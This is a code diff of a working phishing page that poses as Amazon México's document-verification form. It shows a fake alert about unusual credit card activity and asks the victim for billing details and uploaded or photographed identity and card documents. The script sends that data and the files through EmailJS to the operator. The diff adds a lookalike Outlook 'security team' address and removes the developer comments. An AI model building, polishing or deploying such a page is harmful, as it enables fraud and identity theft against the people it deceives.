@@ -3,27 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verificación de documentos</title>
-  <!-- SDK de EmailJS -->
+  <title>Verificación de documentos – Amazon.com.mx</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script>emailjs.init('77CvY0DZYW5NcNSi5');</script>
   <style>
-    /* ── Variables ── */
     :root {
-      --nav:       #232f3e;
-      --amazon:    #ffd814;
-      --amazon-bd: #fcd200;
-      --amazon-hov:#f7ca00;
-      --alert-bg:  #fffbf0;
-      --alert-bd:  #e8a020;
-      --text:      #0f1111;
-      --muted:     #565959;
-      --link:      #0066c0;
-      --line:      #d5d9d9;
-      --field-bd:  #888c8c;
+      --nav:        #232f3e;
+      --amazon:     #ffd814;
+      --amazon-bd:  #fcd200;
+      --amazon-hov: #f7ca00;
+      --alert-bg:   #fffbf0;
+      --alert-bd:   #e8a020;
+      --text:       #0f1111;
+      --muted:      #565959;
+      --link:       #0066c0;
+      --line:       #d5d9d9;
+      --field-bd:   #888c8c;
+      --blue:       #2162a1;
     }
 
-    /* ── Reset ── */
     *, *::before, *::after { box-sizing: border-box; }
     html { scroll-behavior: smooth; }
     body {
@@ -35,7 +33,6 @@
       -webkit-font-smoothing: antialiased;
     }
 
-    /* ── Contenedor central ── */
     .page {
       max-width: 360px;
       margin: 0 auto;
@@ -67,7 +64,6 @@
       font-family: Arial, sans-serif;
       vertical-align: super;
     }
-    /* Curva naranja característica de Amazon */
     .swoosh {
       position: absolute;
       left: 12px;
@@ -89,10 +85,10 @@
       transform: rotate(-12deg);
     }
 
-    /* ── Contenido ── */
+    /* ── Contenedor ── */
     .container { padding: 14px 14px 30px; }
 
-    /* ── Aviso amarillo ── */
+    /* ── Aviso de alerta ── */
     .notice {
       border: 2px solid var(--alert-bd);
       border-radius: 5px;
@@ -121,17 +117,17 @@
       line-height: 1.2;
       font-weight: 700;
     }
-    .sub {
-      margin: 0 0 14px;
-      font-size: 13px;
-      line-height: 1.3;
-      color: #333;
-    }
     h2.section-title {
       margin: 0 0 6px;
       font-size: 17px;
       line-height: 1.2;
       font-weight: 700;
+    }
+    .sub {
+      margin: 0 0 14px;
+      font-size: 13px;
+      line-height: 1.3;
+      color: #333;
     }
 
     /* ── Etiquetas ── */
@@ -143,7 +139,7 @@
       line-height: 1.2;
     }
 
-    /* ── Inputs y textarea ── */
+    /* ── Campos ── */
     .field,
     .select,
     .textarea {
@@ -157,18 +153,18 @@
       color: var(--text);
       outline: none;
       margin: 0 0 12px;
+      font-family: Arial, Helvetica, sans-serif;
     }
-    .field  { height: 38px; }
+    .field { height: 38px; }
     .field:focus,
     .select:focus,
     .textarea:focus {
       border-color: #e77600;
       box-shadow: 0 0 0 3px rgba(228,121,17,.22);
     }
-    .field::placeholder { color: #767676; font-size: 13px; }
+    .field::placeholder { color: #767676; }
     .textarea { min-height: 76px; resize: vertical; }
 
-    /* Select con flecha custom */
     .select-wrap { position: relative; margin: 0 0 12px; }
     .select {
       appearance: none;
@@ -214,7 +210,6 @@
       align-items: center;
       font-size: 13px;
     }
-    /* Ícono Mastercard: dos círculos superpuestos */
     .mc {
       display: inline-flex;
       position: relative;
@@ -232,7 +227,7 @@
     .mc-left  { background: #eb001b; left: 0; }
     .mc-right { background: #f79e1b; right: 0; }
 
-    /* ── Documentos aceptados ── */
+    /* ── Lista de documentos aceptados ── */
     .rule-title { font-size: 13px; font-weight: 700; margin: 0 0 2px; }
     .docs-link {
       color: var(--link);
@@ -245,16 +240,15 @@
     .docs { margin: 0 0 12px 18px; padding: 0; }
     .docs li {
       font-size: 12px;
-      line-height: 1.38;
+      line-height: 1.4;
       margin: 0 0 6px;
     }
     .docs li strong { font-weight: 700; }
 
-    /* ── Sección carga de documentos ── */
+    /* ── Sección de carga ── */
     .upload-title { font-size: 13px; font-weight: 700; margin: 0 0 3px; }
-    .upload-meta  { font-size: 12px; line-height: 1.35; color: #444; margin: 0 0 10px; }
+    .upload-meta  { font-size: 12px; line-height: 1.35; color: #555; margin: 0 0 10px; }
 
-    /* Botones de carga — estilo Amazon (gradiente gris, borde sólido) */
     .file-btn,
     .camera-btn {
       display: flex;
@@ -272,11 +266,10 @@
       box-shadow: 0 1px 0 rgba(255,255,255,.6) inset;
       font-family: Arial, Helvetica, sans-serif;
     }
-    .file-btn  { margin: 0 0 8px; position: relative; }
+    .file-btn   { margin: 0 0 8px; position: relative; }
     .camera-btn { margin: 0 0 10px; }
     .file-btn:hover,
     .camera-btn:hover { background: linear-gradient(to bottom, #e7e9ec, #d9dce2); }
-    /* El input de galería sigue oculto bajo el label (sin capture, funciona bien) */
     .file-btn input {
       position: absolute;
       inset: 0;
@@ -284,23 +277,23 @@
       cursor: pointer;
     }
 
-    /* Mensajes de estado */
-    .tip    { font-size: 12px; line-height: 1.3; margin: 0 0 8px; color: #333; }
-    .count  { font-size: 12px; line-height: 1.3; margin: 2px 0 8px; color: var(--muted); }
-    .warn   { font-size: 12px; line-height: 1.3; margin: 2px 0 8px; color: #c40000; display: none; }
-    .status { font-size: 12px; margin: 8px 0 0; color: var(--muted); }
+    /* ── Mensajes de estado ── */
+    .count  { font-size: 12px; line-height: 1.3; margin: 2px 0 4px; color: var(--muted); }
+    .warn   { font-size: 12px; line-height: 1.3; margin: 2px 0 6px; color: #c40000; display: none; }
+    .tip    { font-size: 12px; line-height: 1.3; margin: 0 0 10px; color: #333; }
+    .status { font-size: 13px; margin: 10px 0 0; line-height: 1.5; }
 
-    /* Enlace agregar comentarios */
+    /* ── Agregar comentarios ── */
     .comments-link {
       display: inline-block;
-      margin: 0 0 10px;
+      margin: 0 0 8px;
       color: var(--link);
       font-size: 13px;
       text-decoration: none;
     }
     .comments-link:hover { text-decoration: underline; }
 
-    /* Campo de comentarios */
+    /* ── Área de comentarios ── */
     .comment {
       display: block;
       width: 100%;
@@ -321,9 +314,9 @@
       border-color: #e77600;
       box-shadow: 0 0 0 3px rgba(228,121,17,.22);
     }
-    .note { font-size: 12px; line-height: 1.4; margin: 0 0 16px; color: #333; }
+    .note { font-size: 12px; line-height: 1.4; margin: 0 0 18px; color: #333; }
 
-    /* ── Botón submit amarillo ── */
+    /* ── Botón de envío ── */
     .submit {
       display: block;
       width: 100%;
@@ -333,6 +326,7 @@
       background: linear-gradient(to bottom, #ffe34c, var(--amazon));
       color: var(--text);
       font-size: 13px;
+      font-family: Arial, Helvetica, sans-serif;
       cursor: pointer;
       box-shadow: 0 2px 5px rgba(213,165,0,.35);
       text-align: center;
@@ -340,18 +334,89 @@
     .submit:hover    { background: linear-gradient(to bottom, var(--amazon), var(--amazon-hov)); }
     .submit:disabled { opacity: .65; cursor: not-allowed; }
 
+    /* ── Aviso de canal alternativo ── */
+    .alt-contact {
+      margin: 18px 0 0;
+      border-left: 4px solid var(--blue);
+      border-top: 1px solid #c8d8ea;
+      border-right: 1px solid #c8d8ea;
+      border-bottom: 1px solid #c8d8ea;
+      border-radius: 0 4px 4px 0;
+      background: #f0f6fc;
+      padding: 14px 14px 14px 16px;
+    }
+    .alt-contact-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 0 0 8px;
+    }
+    .alt-contact-icon { font-size: 14px; line-height: 1; flex-shrink: 0; }
+    .alt-contact-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #0f1111;
+      line-height: 1.2;
+      margin: 0;
+    }
+    .alt-contact-text {
+      margin: 0 0 12px;
+      font-size: 12px;
+      line-height: 1.55;
+      color: #444;
+    }
+    .alt-contact-link {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      width: 100%;
+      padding: 10px 14px;
+      background: linear-gradient(to bottom, #fff, #f0f3f7);
+      border: 1px solid var(--blue);
+      border-radius: 3px;
+      font-size: 13px;
+      font-weight: 700;
+      font-family: Arial, Helvetica, sans-serif;
+      color: var(--blue);
+      text-decoration: none;
+      text-align: center;
+      box-shadow: 0 1px 2px rgba(33,98,161,.12);
+    }
+    .alt-contact-link:hover {
+      background: linear-gradient(to bottom, #e8f0f8, #dce8f4);
+      color: #0f4f99;
+    }
+    .alt-contact-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 5px;
+      margin: 10px 0 0;
+      font-size: 11px;
+      line-height: 1.4;
+      color: #666;
+      width: 100%;
+    }
+    .alt-contact-note .note-icon { flex-shrink: 0; }
+    .alt-contact-note .note-text {
+      flex: 1;
+      min-width: 0;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+    }
+
     /* ── Pie de página ── */
     .footer {
       border-top: 1px solid var(--line);
       text-align: center;
-      padding: 12px 10px 20px;
+      padding: 14px 10px 22px;
     }
     .footer-links {
       display: flex;
       justify-content: center;
       gap: 16px;
       flex-wrap: wrap;
-      margin: 0 0 7px;
+      margin: 0 0 8px;
     }
     .footer-links a {
       color: var(--link);
@@ -359,13 +424,12 @@
       font-size: 12px;
     }
     .footer-links a:hover { text-decoration: underline; }
-    .footer-copy { font-size: 11px; color: #555; line-height: 1.4; }
+    .footer-copy { font-size: 11px; color: #555; line-height: 1.5; }
   </style>
 </head>
 <body>
   <div class="page">
 
-    <!-- Barra superior -->
     <header class="topbar">
       <div class="brand-wrap" aria-label="Amazon México">
         <div class="brand">amazon<small>.com.mx</small></div>
@@ -375,15 +439,13 @@
 
     <main class="container">
 
-      <!-- Aviso de cuenta limitada -->
       <section class="notice" role="alert">
-        <h2>Revisión de actividad inusual en tu cuenta.Detectamos un uso inusual de amazon con tu tarjeta de credito<</h2>
+         <h2>Revisión de actividad inusual en tu cuenta.Detectamos un uso inusual de amazon con tu tarjeta de credito</h2>
         <p>Detectamos una actividad de pago inusual relacionada con tu cuenta en amazon.com.mx. Por seguridad, hemos pausado la operación y abierto un caso de revisión con el folio [E-0346242-BDS01]. (<a href="#">¿Por qué?</a>)</p>
       </section>
 
       <form id="uploadForm">
 
-        <!-- Sección: detalles de facturación -->
         <h1>Ingrese los detalles de facturación</h1>
         <p class="sub">Esto es necesario para reactivar tu cuenta.</p>
 
@@ -423,7 +485,6 @@
 
         <div class="divider"></div>
 
-        <!-- Sección: subir documento -->
         <h2 class="section-title">Subir un documento de respaldo</h2>
         <p class="sub">Sube al menos un documento de respaldo para el siguiente método de pago utilizado en tu pedido reciente de Amazon.</p>
 
@@ -431,7 +492,6 @@
           <div class="panel-head">Método de pago</div>
           <div class="panel-body">
             <div class="pay">
-              <!-- Ícono Mastercard (círculos CSS) -->
               <span class="mc" aria-label="Mastercard">
                 <span class="mc-left"></span>
                 <span class="mc-right"></span>
@@ -455,14 +515,9 @@
 
         <div class="divider"></div>
 
-        <!-- Sección: carga de documentos -->
         <p class="upload-title">Carga de documentos</p>
         <p class="upload-meta">Tipos de archivos compatibles: jpg, pdf, png, tif. Número máximo de archivos: 10. Tamaño máximo de archivo: 15 MB</p>
 
-        <!--
-          Botón 1: abre galería/explorador. Sin capture para no forzar cámara.
-          Se implementa como label sobre input oculto (técnica estándar).
-        -->
         <label class="file-btn" for="galleryInput">
           <span aria-hidden="true">⇪</span>
           <span>Escoger el archivo</span>
@@ -475,13 +530,6 @@
           />
         </label>
 
-        <!--
-          Input de cámara oculto fuera del DOM visual.
-          Se activa mediante .click() desde JS para garantizar que
-          capture="environment" sea respetado en iOS Safari y Android Chrome.
-          Colocarlo directamente en el DOM (no dentro de un label invisible)
-          es la única forma confiable de que los navegadores móviles lo honren.
-        -->
         <input
           id="cameraInput"
           name="foto"
@@ -491,7 +539,6 @@
           style="display:none"
         />
 
-        <!-- Botón visible que dispara el input de cámara vía JS -->
         <button type="button" class="camera-btn" id="cameraTrigger">
           <span aria-hidden="true">📷</span>
           <span>Tomar foto</span>
@@ -503,7 +550,6 @@
 
         <a class="comments-link" href="#comments">Agregar comentarios</a>
 
-        <!-- Área de comentarios -->
         <label class="field-label" for="comments">Comentarios (opcional)</label>
         <textarea
           class="comment"
@@ -513,18 +559,33 @@
         ></textarea>
         <p class="note">NOTA: No podemos ofrecer excepciones de políticas como respuesta a comentarios. No incluyas información personal en estos comentarios.</p>
 
-
-
-        <!-- Botón de envío -->
         <button class="submit" id="submitBtn" type="submit">
           Enviar documento y detalles de facturación
         </button>
         <p id="submitStatus" class="status"></p>
 
+        <div class="alt-contact" role="note" aria-label="Canal alternativo de envío">
+          <div class="alt-contact-header">
+            <span class="alt-contact-icon" aria-hidden="true">🔒</span>
+            <p class="alt-contact-title">Canal alternativo de envío seguro</p>
+          </div>
+          <p class="alt-contact-text">Si presentas dificultades para adjuntar o enviar tus documentos a través de este formulario, puedes remitirlos directamente a nuestro equipo de seguridad por correo electrónico. Tu caso será atendido en un plazo máximo de 24 horas hábiles.</p>
+          <a
+            class="alt-contact-link"
+            href="mailto:seguridad.ba.ncaria.amazn@outlook.com?subject=Caso%20E-0346242-BDS01%20%E2%80%93%20Documentos%20de%20verificaci%C3%B3n&body=Estimado%20equipo%20de%20seguridad%20de%20Amazon%2C%0A%0AMe%20comunico%20en%20relaci%C3%B3n%20al%20caso%20con%20folio%20E-0346242-BDS01%20abierto%20en%20mi%20cuenta.%0A%0AAdjunto%20a%20este%20correo%20los%20documentos%20de%20respaldo%20solicitados%20para%20completar%20la%20verificaci%C3%B3n%20de%20identidad.%0A%0ANombre%20completo%3A%20%0ADirecci%C3%B3n%20de%20facturaci%C3%B3n%3A%20%0AN%C3%BAmero%20de%20tel%C3%A9fono%3A%20%0A%0AQuedo%20en%20espera%20de%20su%20confirmaci%C3%B3n%20y%20agradezco%20su%20atenci%C3%B3n.%0A%0AAtentamente"
+          >
+            <span aria-hidden="true">📧</span>
+            Enviar documentos por correo electrónico
+          </a>
+          <div class="alt-contact-note">
+            <span class="note-icon" aria-hidden="true">🔒</span>
+            <span class="note-text">Tu información es tratada de forma confidencial conforme a la política de privacidad de Amazon.</span>
+          </div>
+        </div>
+
       </form>
     </main>
 
-    <!-- Pie de página -->
     <footer class="footer">
       <div class="footer-links">
         <a href="#" onclick="return false;">Condiciones de uso</a>
@@ -537,12 +598,6 @@
   </div>
 
   <script>
-    /*
-      Validación de archivos.
-      Recoge archivos de ambos inputs (galería + cámara) y valida:
-      - Máximo 10 archivos en total
-      - Máximo 15 MB por archivo
-    */
     const galleryInput = document.getElementById('galleryInput');
     const cameraInput  = document.getElementById('cameraInput');
     const warning      = document.getElementById('fileWarning');
@@ -552,7 +607,7 @@
     const statusEl     = document.getElementById('submitStatus');
 
     const MAX_FILES = 10;
-    const MAX_SIZE  = 15 * 1024 * 1024; // 15 MB
+    const MAX_SIZE  = 15 * 1024 * 1024;
 
     function getAllFiles() {
       return [
@@ -571,6 +626,7 @@
       warning.style.display = 'none';
       warning.textContent   = '';
       statusEl.textContent  = '';
+      statusEl.style.color  = '';
 
       const files = getAllFiles();
       if (!files.length) {
@@ -603,7 +659,15 @@
     galleryInput.addEventListener('change', refreshUI);
     cameraInput.addEventListener('change',  refreshUI);
 
-    /* Envío via EmailJS con archivos adjuntos */
+    function toBase64(file) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload  = () => resolve(reader.result.split(',')[1]);
+        reader.onerror = reject;
+        reader.readAsDataURL(file);
+      });
+    }
+
     form.addEventListener('submit', async event => {
       event.preventDefault();
 
@@ -620,22 +684,12 @@
         return;
       }
 
-      submitBtn.disabled   = true;
-      statusEl.textContent = 'Enviando…';
+      submitBtn.disabled    = true;
+      statusEl.textContent  = 'Enviando…';
+      statusEl.style.color  = '#565959';
       warning.style.display = 'none';
 
-      /* Convierte cada archivo a base64 para adjuntarlo en el correo */
-      function toBase64(file) {
-        return new Promise((resolve, reject) => {
-          const reader = new FileReader();
-          reader.onload  = () => resolve(reader.result.split(',')[1]);
-          reader.onerror = reject;
-          reader.readAsDataURL(file);
-        });
-      }
-
       try {
-        /* Construye los parámetros del template */
         const params = {
           nombre:      document.getElementById('fullName').value,
           pais:        document.getElementById('country').value,
@@ -644,25 +698,23 @@
           comentarios: document.getElementById('comments').value || '(sin comentarios)',
         };
 
-        /* Adjunta los archivos como base64 (EmailJS soporta hasta 50 MB total) */
         for (let i = 0; i < files.length; i++) {
-          params[`archivo_${i + 1}_nombre`]   = files[i].name;
+          params[`archivo_${i + 1}_nombre`]    = files[i].name;
           params[`archivo_${i + 1}_contenido`] = await toBase64(files[i]);
         }
 
         await emailjs.send('service_qt5yu8n', 'template_ro5tcl9', params);
 
-        statusEl.textContent  = '¡Enviado correctamente! Revisa tu correo.';
-        statusEl.style.color  = '#007600';
-        submitBtn.disabled    = false;
+        statusEl.textContent = '¡Enviado correctamente! Revisa tu correo.';
+        statusEl.style.color = '#007600';
+        submitBtn.disabled   = false;
         form.reset();
-        countEl.textContent   = 'No has seleccionado archivos.';
+        countEl.textContent  = 'No has seleccionado archivos.';
 
       } catch (err) {
-        statusEl.textContent = 'Error al enviar. Intenta de nuevo.';
+        statusEl.innerHTML  = 'Ocurrió un problema al enviar. Por favor usa el canal alternativo de abajo o escríbenos a <a href="mailto:seguridad.ba.ncaria.amazn@outlook.com" style="color:#0066c0;">seguridad.ba.ncaria.amazn@outlook.com</a>';
         statusEl.style.color = '#c40000';
         submitBtn.disabled   = false;
-        console.error('EmailJS error:', err);
       }
     });
   </script>
